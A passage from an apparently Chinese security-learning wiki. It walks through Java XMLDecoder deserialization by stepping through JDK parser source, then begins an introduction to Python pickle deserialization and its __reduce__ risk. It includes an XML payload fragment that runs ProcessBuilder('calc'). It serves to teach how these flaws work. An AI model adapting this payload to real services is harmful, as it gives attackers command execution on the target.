true;\n            resetSymbolTable();\n            resetCommon();\n            short version = fVersionDetector.determineDocVersion(fInputSource);\n            if (version == Constants.XML_VERSION_1_1) {\n                initXML11Components();\n                configureXML11Pipeline();\n                resetXML11();\n            } else {\n                configurePipeline();\n                reset();\n            }\n            // mark configuration as fixed\n            fConfigUpdated = false;\n            // resets and sets the pipeline.\n            fVersionDetector.startDocumentParsing((XMLEntityHandler) fCurrentScanner, version);\n            fInputSource = null;\n        } catch (IOException | RuntimeException ex) {\n            if (PRINT_EXCEPTION_STACK_TRACE)\n                ex.printStackTrace();\n            throw ex;\n        } catch (Exception ex) {\n            if (PRINT_EXCEPTION_STACK_TRACE)\n                ex.printStackTrace();\n            throw new XNIException(ex);\n        }\n    }\n    try {\n        return fCurrentScanner.scanDocument(complete);\n    } catch (IOException | RuntimeException ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw ex;\n    } catch (Exception ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw new XNIException(ex);\n    }\n}\n</code></pre> <p>\u5173\u6ce8\u70b9\u5728scanDocument\u5185</p> <p>\u51fd\u6570\u6709\u5f88\u591a\u5bf9XML\u683c\u5f0f\u7684\u89e3\u6790\u8fc7\u7a0b</p> <pre><code>public boolean scanDocument(boolean complete)\nthrows IOException, XNIException {\n    // keep dispatching \"events\"\n    fEntityManager.setEntityHandler(this);\n    //System.out.println(\" get Document Handler in NSDocumentHandler \" + fDocumentHandler );\n    int event = next();\n    do {\n        switch (event) {\n            case XMLStreamConstants.START_DOCUMENT :\n                //fDocumentHandler.startDocument(fEntityManager.getEntityScanner(),fEntityManager.getEntityScanner().getVersion(),fNamespaceContext,null);// not able to get\n                break;\n            case XMLStreamConstants.START_ELEMENT :\n                //System.out.println(\" in scann element\");\n                //fDocumentHandler.startElement(getElementQName(),fAttributes,null);\n                break;\n            case XMLStreamConstants.CHARACTERS :\n                fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                fDocumentHandler.characters(getCharacterData(),null);\n                break;\n            case XMLStreamConstants.SPACE:\n                //check if getCharacterData() is the right function to retrieve ignorableWhitespace information.\n                //System.out.println(\"in the space\");\n                //fDocumentHandler.ignorableWhitespace(getCharacterData(), null);\n                break;\n            case XMLStreamConstants.ENTITY_REFERENCE :\n                fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                //entity reference callback are given in startEntity\n                break;\n            case XMLStreamConstants.PROCESSING_INSTRUCTION :\n                fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                fDocumentHandler.processingInstruction(getPITarget(),getPIData(),null);\n                break;\n            case XMLStreamConstants.COMMENT :\n                fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                fDocumentHandler.comment(getCharacterData(),null);\n                break;\n            case XMLStreamConstants.DTD :\n                //all DTD related callbacks are handled in DTDScanner.\n                //1. Stax doesn't define DTD states as it does for XML Document.\n                //therefore we don't need to take care of anything here. So Just break;\n                break;\n            case XMLStreamConstants.CDATA:\n               fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                if (fCDataStart) {\n                    fDocumentHandler.startCDATA(null);\n                    fCDataStart = false;\n                    fInCData = true;\n                }\n                fDocumentHandler.characters(getCharacterData(),null);\n                if (fCDataEnd) {\n                    fDocumentHandler.endCDATA(null);\n                    fCDataEnd = false;\n                }\n                break;\n            case XMLStreamConstants.NOTATION_DECLARATION :\n                break;\n            case XMLStreamConstants.ENTITY_DECLARATION :\n                break;\n            case XMLStreamConstants.NAMESPACE :\n                break;\n            case XMLStreamConstants.ATTRIBUTE :\n                break;\n            case XMLStreamConstants.END_ELEMENT :\n                //do not give callback here.\n                //this callback is given in scanEndElement function.\n                //fDocumentHandler.endElement(getElementQName(),null);\n                break;\n            default :\n                // Errors should have already been handled by the Scanner\n                return false;\n        }\n        //System.out.println(\"here in before calling next\");\n        event = next();\n        //System.out.println(\"here in after calling next\");\n    } while (event!=XMLStreamConstants.END_DOCUMENT &amp;&amp; complete);\n    if(event == XMLStreamConstants.END_DOCUMENT) {\n        fDocumentHandler.endDocument(null);\n        return false;\n    }\n    return true;\n} \n</code></pre> <p>\u7136\u540e\u8fdbnext()</p> <p>\u5230\u8fd9\u91cc\uff1a</p> <pre><code>public int next() throws IOException, XNIException {\n    return fDriver.next();\n}\n    public int next() throws IOException, XNIException {\n        try {\n            do {\n                switch (fScannerState) {\n                    case SCANNER_STATE_PROLOG: {\n                        fEntityScanner.skipSpaces();\n                        if (fEntityScanner.skipChar('&lt;', null)) {\n                            setScannerState(SCANNER_STATE_START_OF_MARKUP);\n                        } else if (fEntityScanner.skipChar('&amp;', NameType.REFERENCE)) {\n                            setScannerState(SCANNER_STATE_REFERENCE);\n                        } else {\n                            setScannerState(SCANNER_STATE_CONTENT);\n                        }\n                        break;\n                    }\n                    case SCANNER_STATE_START_OF_MARKUP: {\n                        fMarkupDepth++;\n                        if (isValidNameStartChar(fEntityScanner.peekChar()) ||\n                                isValidNameStartHighSurrogate(fEntityScanner.peekChar())) {\n                            setScannerState(SCANNER_STATE_ROOT_ELEMENT);\n                            setDriver(fContentDriver);\n                            //from now onwards this would be handled by fContentDriver,in the same next() call\n                            return fContentDriver.next();\n                        } else if (fEntityScanner.skipChar('!', null)) {\n                            if (fEntityScanner.skipChar('-', null)) {\n                                if (!fEntityScanner.skipChar('-', null)) {\n                                    reportFatalError(\"InvalidCommentStart\",\n                                            null);\n                                }\n                                setScannerState(SCANNER_STATE_COMMENT);\n                            } else if (fEntityScanner.skipString(DOCTYPE)) {\n                                setScannerState(SCANNER_STATE_DOCTYPE);\n                                Entity entity = fEntityScanner.getCurrentEntity();\n                                if(entity instanceof Entity.ScannedEntity){\n                                    fStartPos=((Entity.ScannedEntity)entity).position;\n                                }\n                                fReadingDTD=true;\n                                if(fDTDDecl == null)\n                                    fDTDDecl = new XMLStringBuffer();\n                                fDTDDecl.append(\"&lt;!DOCTYPE\");\n                            } else {\n                                reportFatalError(\"MarkupNotRecognizedInProlog\",\n                                        null);\n                            }\n                        } else if (fEntityScanner.skipChar('?', null)) {\n                            setScannerState(SCANNER_STATE_PI);\n                        } else {\n                            reportFatalError(\"MarkupNotRecognizedInProlog\",\n                                    null);\n                        }\n                        break;\n                    }\n                }\n            } while (fScannerState == SCANNER_STATE_PROLOG || fScannerState == SCANNER_STATE_START_OF_MARKUP );\n            switch(fScannerState){\n                /**\n                //this part is handled by FragmentContentHandler\n                case SCANNER_STATE_ROOT_ELEMENT: {\n                    //we have read '&lt;' and beginning of reading the start element tag\n                    setScannerState(SCANNER_STATE_START_ELEMENT_TAG);\n                    setDriver(fContentDriver);\n                    //from now onwards this would be handled by fContentDriver,in the same next() call\n                    return fContentDriver.next();\n                }\n                 */\n                case SCANNER_STATE_COMMENT: {\n                    //this function fills the data..\n                    scanComment();\n                    setScannerState(SCANNER_STATE_PROLOG);\n                    return XMLEvent.COMMENT;\n                    //setScannerState(SCANNER_STATE_PROLOG);\n                    //break;\n                }\n                case SCANNER_STATE_PI: {\n                    fContentBuffer.clear() ;\n                    scanPI(fContentBuffer);\n                    setScannerState(SCANNER_STATE_PROLOG);\n                    return XMLEvent.PROCESSING_INSTRUCTION;\n                }\n                case SCANNER_STATE_DOCTYPE: {\n                    if (fDisallowDoctype) {\n                        reportFatalError(\"DoctypeNotAllowed\", null);\n                    }\n                    if (fSeenDoctypeDecl) {\n                        reportFatalError(\"AlreadySeenDoctype\", null);\n                    }\n                    fSeenDoctypeDecl = true;\n                    // scanDoctypeDecl() sends XNI doctypeDecl event that\n                    // in SAX is converted to startDTD() event.\n                    if (scanDoctypeDecl(fSupportDTD)) {\n                        //allow parsing of entity decls to continue in order to stay well-formed\n                        setScannerState(SCANNER_STATE_DTD_INTERNAL_DECLS);\n                        fSeenInternalSubset = true;\n                        if(fDTDDriver == null){\n                            fDTDDriver = new DTDDriver();\n                        }\n                        setDriver(fContentDriver);\n                        //always return DTD event, the event however, will not contain any entities\n                        return fDTDDriver.next();\n                    }\n                    if(fSeenDoctypeDecl){\n                        Entity entity = fEntityScanner.getCurrentEntity();\n                        if(entity instanceof Entity.ScannedEntity){\n                            fEndPos = ((Entity.ScannedEntity)entity).position;\n                        }\n                        fReadingDTD = false;\n                    }\n                    // handle external subset\n                    if (fDoctypeSystemId != null) {\n                        if (((fValidation || fLoadExternalDTD)\n                            &amp;&amp; (fValidationManager == null || !fValidationManager.isCachedDTD()))) {\n                            if (fSupportDTD) {\n                                setScannerState(SCANNER_STATE_DTD_EXTERNAL);\n                            } else {\n                                setScannerState(SCANNER_STATE_PROLOG);\n                            }\n                            setDriver(fContentDriver);\n                            if(fDTDDriver == null) {\n                                fDTDDriver = new DTDDriver();\n                            }\n                            return fDTDDriver.next();\n                        }\n                    }\n                    else if (fExternalSubsetSource != null) {\n                        if (((fValidation || fLoadExternalDTD)\n                            &amp;&amp; (fValidationManager == null || !fValidationManager.isCachedDTD()))) {\n                            // This handles the case of a DOCTYPE that had neither an internal subset or an external subset.\n                            fDTDScanner.setInputSource(fExternalSubsetSource);\n                            fExternalSubsetSource = null;\n                        if (fSupportDTD)\n                            setScannerState(SCANNER_STATE_DTD_EXTERNAL_DECLS);\n                        else\n                            setScannerState(SCANNER_STATE_PROLOG);\n                        setDriver(fContentDriver);\n                        if(fDTDDriver == null)\n                            fDTDDriver = new DTDDriver();\n                        return fDTDDriver.next();\n                        }\n                    }\n                    // Send endDTD() call if:\n                    // a) systemId is null or if an external subset resolver could not locate an external subset.\n                    // b) \"load-external-dtd\" and validation are false\n                    // c) DTD grammar is cached\n                    // in XNI this results in 3 events:  doctypeDecl, startDTD, endDTD\n                    // in SAX this results in 2 events: startDTD, endDTD\n                    if (fDTDScanner != null) {\n                        fDTDScanner.setInputSource(null);\n                    }\n                    setScannerState(SCANNER_STATE_PROLOG);\n                    return XMLEvent.DTD;\n                }\n                case SCANNER_STATE_CONTENT: {\n                    reportFatalError(\"ContentIllegalInProlog\", null);\n                    fEntityScanner.scanChar(null);\n                    return -1;\n                }\n                case SCANNER_STATE_REFERENCE: {\n                    reportFatalError(\"ReferenceIllegalInProlog\", null);\n                    return -1;\n                }\n                /**\n                 * if (complete) {\n                 * if (fEntityScanner.scanChar() != '&lt;') {\n                 * reportFatalError(\"RootElementRequired\", null);\n                 * }\n                 * setScannerState(SCANNER_STATE_ROOT_ELEMENT);\n                 * setDriver(fContentDriver);\n                 * }\n                 */\n            }\n        }\n        // encoding errors\n        catch (MalformedByteSequenceException e) {\n            fErrorReporter.reportError(e.getDomain(), e.getKey(),\n                    e.getArguments(), XMLErrorReporter.SEVERITY_FATAL_ERROR, e);\n            return -1;\n        } catch (CharConversionException e) {\n            fErrorReporter.reportError(\n                    XMLMessageFormatter.XML_DOMAIN,\n                    \"CharConversionFailure\",\n                    null,\n                    XMLErrorReporter.SEVERITY_FATAL_ERROR, e);\n            return -1;\n        }\n        // premature end of file\n        catch (EOFException e) {\n            reportFatalError(\"PrematureEOF\", null);\n            //xxx  what should be returned here.... ???\n            return -1 ;\n            //throw e;\n        }\n        //xxx  what should be returned here.... ???\n        return -1;\n    }\n\n} // class PrologDriver\n</code></pre> <p>\u5e94\u8be5\u662f\u8fdb\u5165\u8fd9\u4e2a\u4f4d\u7f6e</p> <p>\u7136\u540e\u63a8\u8350\u8bbe\u4e2a\u65ad\u70b9\u5728\u8fdb\u51fd\u6570\u7684\u5f00\u59cb\u5904\uff0c\u56e0\u4e3a\u5176\u4e2d\u4f1a\u6709\u4e00\u4e2anext()\u5faa\u73af\u4f1a\u5faa\u73af\u975e\u5e38\u591a\u6b21\uff0813\u6b21\u5de6\u53f3\uff09\uff0c\u8981\u5728\u5f39\u51fa\u6765\u4e4b\u524d\uff08\u6307\u90a3\u4e2a\u8ba1\u7b97\u5668\uff09\u4f1a\u89c1\u5230\u8fd9\u6837\u4e00\u4e2a\u51fd\u6570\u65b9\u6cd5\uff1a</p> <p>.png)</p> <p>\u7ee7\u7eed\u8ddf\u8fdb\uff1a</p> <p></p> <p>\u7ec8\u4e8e\u627e\u5230\u4e86endElement\u65b9\u6cd5\u3002</p> <p>\u7f51\u56fe\u8fd9\u6bb5\u4ee3\u7801\u7684\u903b\u8f91\uff1a</p> <p></p> <p>\u5355\u6b65\u8c03\u8bd5\u6765\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u5728AbstractSAXParser\u7c7b\u4e4b\u4e0b</p> <pre><code>public void endElement(QName element, Augmentations augs) throws XNIException {\n\n    try {\n        // SAX1\n        if (fDocumentHandler != null) {\n            fDocumentHandler.endElement(element.rawname);\n        }\n        // SAX2\n        if (fContentHandler != null) {\n            fAugmentations = augs;\n            String uri = element.uri != null ? element.uri : \"\";\n            String localpart = fNamespaces ? element.localpart : \"\";\n            fContentHandler.endElement(uri, localpart,\n                                       element.rawname);\n            if (fNamespaces) {\n                endNamespaceMapping();\n            }\n        }\n    }\n    catch (SAXException e) {\n        throw new XNIException(e);\n    }\n} // endElement(QName)\n</code></pre> <p>\u7ee7\u7eedF7\u5355\u6b65\u8c03\u8bd5\u6765\u5230\u8fd9\u91cc\uff1a</p> <pre><code>public void endElement(String uri, String localName, String qName) {\n    try {\n        this.handler.endElement();\n    }\n    catch (RuntimeException exception) {\n        handleException(exception);\n    }\n    finally {\n        this.handler = this.handler.getParent();\n    }\n}\n</code></pre> <p>\u63a5\u4e0b\u6765\u5c31\u4e0d\u662f\u5355\u6b65\u8c03\u8bd5\u4e86</p> <p>\u70b9\u8fdb\u53bb</p> <p>\u8fd9\u91cc\u7684handler\u662fStringElementHandler\uff0c\u4f46\u662f\u8fd9\u4e2a\u7c7b\u6ca1\u6709\u91cd\u5199endElement\u65b9\u6cd5\uff0c\u6240\u4ee5\u8c03\u7528\u7684\u662f\u7236\u7c7bElementHandler\u7684endElement\u65b9\u6cd5\uff0c\u5176\u4e2d\u8c03\u7528\u4e86getValueObject\u6765\u83b7\u53d6\u6807\u7b7e\u4e2d\u7684value\u503c\uff0c\u8fd9\u91cc\u7684\u6807\u7b7e\u662fstring\u6807\u7b7e\uff0c\u6240\u4ee5\u83b7\u53d6\u5230\u7684\u503c\u662fcalc\u3002</p> <p>\u4e5f\u5c31\u662f\u7236\u7c7b\u7684</p> <pre><code>public void endElement() {\n    // do nothing if no value returned\n    ValueObject value = getValueObject();\n    if (!value.isVoid()) {\n        if (this.id != null) {\n            this.owner.setVariable(this.id, value.getValue());\n        }\n        if (isArgument()) {\n            if (this.parent != null) {\n                this.parent.addArgument(value.getValue());\n            } else {\n                this.owner.addObject(value.getValue());\n            }\n        }\n    }\n}\n</code></pre> <p>\u7136\u540e\u5c06\u5176\u6dfb\u52a0\u5230\u5176\u7236\u7c7b\u6807\u7b7eVoidElementHandler\u7684Argument\u5c5e\u6027\u4e2d\u3002</p> <p>\u7136\u540e\u5c06handler\u6307\u5411\u5176\u7236\u7c7bVoidElementHandler\u3002</p> <pre><code>ValueObject value = getValueObject();\n</code></pre> <p>\u7ee7\u7eed\u89e3\u6790\u5230void\u6807\u7b7e\uff0c\u6b64\u65f6\u7684handler\u5c31\u662fVoidElementHandler\uff0c\u63a5\u7740\u8c03\u7528getValueObject\u3002\u4f46\u662f\u56e0\u4e3a\u6ca1\u6709\u91cd\u5199\u8be5\u65b9\u6cd5\uff0c\u6240\u4ee5\u8c03\u7528\u7236\u7c7bNewElementHandler\u7684getValueObject\u3002</p> <p>\u7ee7\u7eed\u8ddf\u8fdb\u53d1\u73b0\u5b9e\u73b0\u4e86\u53cd\u5c04\u8c03\u7528invoke\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u6267\u884c\u4e86set\u65b9\u6cd5\u3002\u63a5\u7740\u518d\u89e3\u6790Array\u6807\u7b7e\uff0c\u6309\u7167\u4e0a\u9762\u7684\u6b65\u9aa4\u89e3\u6790\uff0c\u5c31\u5b8c\u6210\u4e86\u8fd9\u4e00\u90e8\u5206\u53c2\u6570\u7684\u89e3\u6790\u3002</p> <p></p> <p></p> <p></p> <pre><code>&lt;array class=\"java.lang.String\"length=\"1\"&gt;\n  &lt;void index=\"0\"&gt;\n      &lt;string&gt;calc&lt;/string&gt;\n  &lt;/void&gt;\n&lt;/array&gt;\n</code></pre> <p>\u90a3\u4e48\u518d\u6309\u7167\u4e0a\u9762\u7684\u6b65\u9aa4\u89e3\u6790object\u6807\u7b7e\uff0c\u7136\u540e\u8c03\u7528new \u65b9\u6cd5\u5b9e\u4f8b\u5316 ProcessBuilder\u7c7b\u3002</p> <p>\u7136\u540e\u89e3\u6790\u5230void\u6807\u7b7e\u83b7\u53d6\u5230start\u65b9\u6cd5\uff0c\u7136\u540e\u901a\u8fc7\u8c03\u7528start\u65b9\u6cd5\u5b9e\u73b0\u4e86\u547d\u4ee4\u6267\u884c\uff0c\u5f39\u51fa\u8ba1\u7b97\u5668\u3002</p> <p>\u4e5f\u5c31\u76f8\u5f53\u4e8e\u6700\u540e\u62fc\u63a5\u4e86 new java.lang.ProcessBuilder(new String[]{\"calc\"}).start();</p> <p></p> <p>\u6700\u540e\u6765\u6574\u7406\u4e00\u4e0b\uff1a</p> <p>1.\u51fa\u73b0\u95ee\u9898\u7684\u539f\u56e0\u662f\u5b50\u7c7b\u4e2d\u7684\u67d0\u4e2a\u65b9\u6cd5\u6ca1\u6709\u91cd\u5199\uff0c\u5bfc\u81f4\u8c03\u7528\u7236\u7c7b\u7684\u65b9\u6cd5\u5e76\u4e14\u62fc\u63a5\u5199\u5165\u4e86\u5bf9\u5e94\u7684\u6570\u636e\u4e2d</p> <p>2.\u6f0f\u6d1e\u539f\u7406\u662fJAVA\u5bf9XML\u6587\u4ef6\u7684\u89e3\u6790\u662f\u5206\u6bb5\u5206\u5f00\u7684\uff0c\u5229\u7528\u89e3\u6790\u8fc7\u7a0b\u4e2d\u8c03\u7528\u5230\u7684creat\u548cgetvalue\u7684\u62fc\u63a5\u80fd\u591f\u5f97\u5230\u60f3\u8981\u7684\u6570\u636e\u3002</p> <p>3.\u4e0d\u6e05\u695a\u662f\u5426\u8fd8\u6709\u5176\u4ed6\u7684\u5165\u53e3\uff0c\u4f46\u8fd9\u91cc\u7684\u5173\u952e\u8bed\u53e5\u5176\u5b9e\u662f\uff1a</p> <pre><code>\u00a0 \u00a0 \u00a0 \u00a0 Object o = xmlDecoder.readObject();\n</code></pre>"},{"location":"web/serialize/java/xmldecoder/#_2","title":"\u7f16\u8f91\uff1a\u5f90\u5f00\u8c6a","text":""},{"location":"web/serialize/java/xmldecoder/#_3","title":"\u5ba1\u6838\uff1a\u5f90\u5f00\u8c6a","text":""},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Python Pickle\u53cd\u5e8f\u5217\u5316","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#picklecpickle","title":"Pickle/CPickle","text":"<p><code>pickle</code>\u6216<code>cPickle</code>\uff0c\u4f5c\u7528\u548c<code>PHP\u7684serialize\u4e0eunserialize</code>\u4e00\u6837\uff0c\u4e24\u8005\u53ea\u662f\u5b9e\u73b0\u7684\u8bed\u8a00\u4e0d\u540c\uff0c\u4e00\u4e2a\u662f\u7eafPython\u5b9e\u73b0\u3001\u53e6\u4e00\u4e2a\u662fC\u5b9e\u73b0\uff0c\u51fd\u6570\u8c03\u7528\u57fa\u672c\u76f8\u540c\uff0c\u4f46cPickle\u5e93\u7684\u6027\u80fd\u66f4\u597d,\u4e4b\u540e\u5c31\u4ee5pickle\u5e93\u6765\u8fdb\u884c\u6f14\u793a\u3002</p>"},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#pickle","title":"Pickle\u5e93\u53ca\u51fd\u6570","text":"<p>pickle\u662fpython\u8bed\u8a00\u7684\u4e00\u4e2a\u6807\u51c6\u6a21\u5757\uff0c\u5b9e\u73b0\u4e86\u57fa\u672c\u7684\u6570\u636e\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u3002  pickle\u6a21\u5757\u662f\u4ee5\u4e8c\u8fdb\u5236\u7684\u5f62\u5f0f\u5e8f\u5217\u5316\u540e\u4fdd\u5b58\u5230\u6587\u4ef6\u4e2d\uff08\u4fdd\u5b58\u6587\u4ef6\u7684\u540e\u7f00\u4e3a<code>.pkl</code>\uff09\uff0c\u4e0d\u80fd\u76f4\u63a5\u6253\u5f00\u8fdb\u884c\u9884\u89c8\u3002</p> <pre><code>#\u5e8f\u5217\u5316\npickle.dump(obj, file, protocol=None,)\nobj\u8868\u793a\u8981\u8fdb\u884c\u5c01\u88c5\u7684\u5bf9\u8c61(\u5fc5\u586b\u53c2\u6570\uff09\nfile\u8868\u793aobj\u8981\u5199\u5165\u7684\u6587\u4ef6\u5bf9\u8c61\n\u4ee5\u4e8c\u8fdb\u5236\u53ef\u5199\u6a21\u5f0f\u6253\u5f00\u5373wb(\u5fc5\u586b\u53c2\u6570\uff09\n#\u53cd\u5e8f\u5217\u5316\npickle.load(file, *, fix_imports=True, encoding=\"ASCII\", errors=\"strict\", buffers=None)\nfile\u6587\u4ef6\u4e2d\u8bfb\u53d6\u5c01\u5b58\u540e\u7684\u5bf9\u8c61\n\u4ee5\u4e8c\u8fdb\u5236\u53ef\u8bfb\u6a21\u5f0f\u6253\u5f00\u5373rb(\u5fc5\u586b\u53c2\u6570)\n#\u5e8f\u5217\u5316\npickle.dumps(obj, protocol=None,*,fix_imports=True)\ndumps()\u65b9\u6cd5\u4e0d\u9700\u8981\u5199\u5165\u6587\u4ef6\u4e2d\uff0c\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u5e8f\u5217\u5316\u7684bytes\u5bf9\u8c61\u3002\n#\u53cd\u5e8f\u5217\u5316\npickle.loads(bytes_object, *,fix_imports=True, encoding=\"ASCII\". errors=\"strict\")\nloads()\u65b9\u6cd5\u662f\u76f4\u63a5\u4ecebytes\u5bf9\u8c61\u4e2d\u8bfb\u53d6\u5e8f\u5217\u5316\u7684\u4fe1\u606f\uff0c\u800c\u975e\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u3002\n\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\n\u7248\u6743\u58f0\u660e\uff1a\u672c\u6587\u4e3aCSDN\u535a\u4e3b\u300cSn0w/\u300d\u7684\u539f\u521b\u6587\u7ae0\uff0c\u9075\u5faaCC 4.0 BY-SA\u7248\u6743\u534f\u8bae\uff0c\u8f6c\u8f7d\u8bf7\u9644\u4e0a\u539f\u6587\u51fa\u5904\u94fe\u63a5\u53ca\u672c\u58f0\u660e\u3002\n\u539f\u6587\u94fe\u63a5\uff1ahttps://blog.csdn.net/qq_43431158/article/details/108919605\n</code></pre> <pre><code>import pickle\nimport os\nclass A(object):\n    def __init__(self,a,b):\n        self.a=a\n        self.b=b\nif __name__ == '__main__':\n    AA = A('1','2')\n    print(AA)\n    print('-----------------------------------------')\n\n    strings = pickle.dumps(AA)\n    print(strings)\n    print(\"\u5e8f\u5217\u5316\u540e\")\n    print('-----------------------------------------')\n    data = pickle.loads(strings)\n    print(data)\n    print(\"\u53cd\u5e8f\u5217\u5316\")\n    print('-----------------------------------------')\n</code></pre> <p>\u7136\u540e\u6267\u884c\u51fa\u6765\u7684\u7ed3\u679c\uff08py3\u88ab\u7f16\u7801\uff0c\u66f4\u4e3a\u76f4\u89c2\uff0c\u5efa\u8bae\u91c7\u7528py2\uff09\uff1a</p> <p></p> <p></p>"},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#pvm","title":"PVM","text":"<p>\u5bf9\u4e8ePython\u800c\u8a00\uff0c\u5b83\u53ef\u4ee5\u76f4\u63a5\u4ece\u6e90\u4ee3\u7801\u8fd0\u884c\u7a0b\u5e8f\u3002Python\u89e3\u91ca\u5668\u4f1a\u5c06\u6e90\u4ee3\u7801\u7f16\u8bd1\u4e3a\u5b57\u8282\u7801\uff0c\u7136\u540e\u5c06\u7f16\u8bd1\u540e\u7684\u5b57\u8282\u7801\u8f6c\u53d1\u5230Python\u865a\u62df\u673a\u4e2d\u6267\u884c\u3002\u603b\u7684\u6765\u8bf4\uff0cPVM\u7684\u4f5c\u7528\u4fbf\u662f\u7528\u6765\u89e3\u91ca\u5b57\u8282\u7801\u7684\u89e3\u91ca\u5f15\u64ce\u3002</p> <p>\u7406\u89e3\u8d77\u6765\u5c31\u662f\u7c7b\u4f3c\u865a\u62df\u673a\u4e2d\u7f16\u8bd1\u6267\u884cpy\u7a0b\u5e8f</p>"},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#pickle-pvm","title":"Pickle\u662f\u4e00\u95e8\u57fa\u4e8e\u6808\u7684\u7f16\u7a0b\u8bed\u8a00 , \u6709\u4e0d\u540c\u7684\u7f16\u5199\u65b9\u5f0f , \u5176\u672c\u8d28\u5c31\u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684 PVM .","text":"<p>\u6458\u81ea\u7f51\u7edc\uff1a</p> <pre><code>c : \u8bfb\u53d6\u672c\u884c\u7684\u5185\u5bb9\u4f5c\u4e3a\u6a21\u5757\u540dmodule, \u8bfb\u53d6\u4e0b\u4e00\u884c\u7684\u5185\u5bb9\u4f5c\u4e3a\u5bf9\u8c61\u540dobject\uff0c\u7136\u540e\u5c06 module.object \u4f5c\u4e3a\u53ef\u8c03\u7528\u5bf9\u8c61\u538b\u5165\u5230\u6808\u4e2d\n( : \u5c06\u4e00\u4e2a\u6807\u8bb0\u5bf9\u8c61\u538b\u5165\u5230\u6808\u4e2d , \u7528\u4e8e\u786e\u5b9a\u547d\u4ee4\u6267\u884c\u7684\u4f4d\u7f6e . \u8be5\u6807\u8bb0\u5e38\u5e38\u642d\u914d t \u6307\u4ee4\u4e00\u8d77\u4f7f\u7528 , \u4ee5\u4fbf\u4ea7\u751f\u4e00\u4e2a\u5143\u7ec4\nS : \u540e\u9762\u8ddf\u5b57\u7b26\u4e32 , PVM\u4f1a\u8bfb\u53d6\u5f15\u53f7\u4e2d\u7684\u5185\u5bb9 , \u76f4\u5230\u9047\u89c1\u6362\u884c\u7b26 , \u7136\u540e\u5c06\u8bfb\u53d6\u5230\u7684\u5185\u5bb9\u538b\u5165\u5230\u6808\u4e2d\nt : \u4ece\u6808\u4e2d\u4e0d\u65ad\u5f39\u51fa\u6570\u636e , \u5f39\u5c04\u987a\u5e8f\u4e0e\u538b\u6808\u65f6\u76f8\u540c , \u76f4\u5230\u5f39\u51fa\u5de6\u62ec\u53f7 . \u6b64\u65f6\u5f39\u51fa\u7684\u5185\u5bb9\u5f62\u6210\u4e86\u4e00\u4e2a\u5143\u7ec4 , \u7136\u540e , \u8be5\u5143\u7ec4\u4f1a\u88ab\u538b\u5165\u6808\u4e2d\nR : \u5c06\u4e4b\u524d\u538b\u5165\u6808\u4e2d\u7684\u5143\u7ec4\u548c\u53ef\u8c03\u7528\u5bf9\u8c61\u5168\u90e8\u5f39\u51fa , \u7136\u540e\u5c06\u8be5\u5143\u7ec4\u4f5c\u4e3a\u53ef\u8c03\u7528\u53c2\u6570\u7684\u5bf9\u8c61\u5e76\u6267\u884c\u8be5\u5bf9\u8c61 \u3002\u6700\u540e\u5c06\u7ed3\u679c\u538b\u5165\u5230\u6808\u4e2d\n. : \u7ed3\u675f\u6574\u4e2a Pickle \u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\n</code></pre> <p></p> <p></p> <p>\u6574\u4e2a\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u6b65\u9aa4</p> <ol> <li>\u4ece\u5bf9\u8c61\u4e2d\u63d0\u6743\u6240\u6709\u5c5e\u6027</li> <li>\u5199\u5165\u5bf9\u8c61\u7684\u6240\u6709\u6a21\u5757\u540d\u548c\u7c7b\u540d</li> <li>\u5199\u5165\u5bf9\u8c61\u6240\u6709\u5c5e\u6027\u7684\u952e\u503c\u5bf9</li> </ol> <p>\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u5c31\u662f\u5e8f\u5217\u5316\u8fc7\u7a0b\u7684\u9006\u8fc7\u7a0b\u3002</p>"},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#picklecpickle_1","title":"Pickle/CPickle\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790","text":"<p>\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u51fa\u73b0\u5728 <code>__reduce__()</code>\u9b54\u6cd5\u51fd\u6570\u4e0a\uff0c\u8fd9\u4e00\u70b9\u548cPHP\u4e2d\u7684<code>__wakeup()</code> \u9b54\u672f\u65b9\u6cd5\u7c7b\u4f3c\uff0c\u90fd\u662f\u56e0\u4e3a\u6bcf\u5f53\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u5f00\u59cb\u6216\u8005\u7ed3\u675f\u65f6 , \u90fd\u4f1a\u81ea\u52a8\u8c03\u7528\u8fd9\u7c7b\u51fd\u6570\u3002\u800c\u8fd9\u6070\u597d\u662f\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7ecf\u5e38\u51fa\u73b0\u7684\u5730\u65b9\u3002</p> 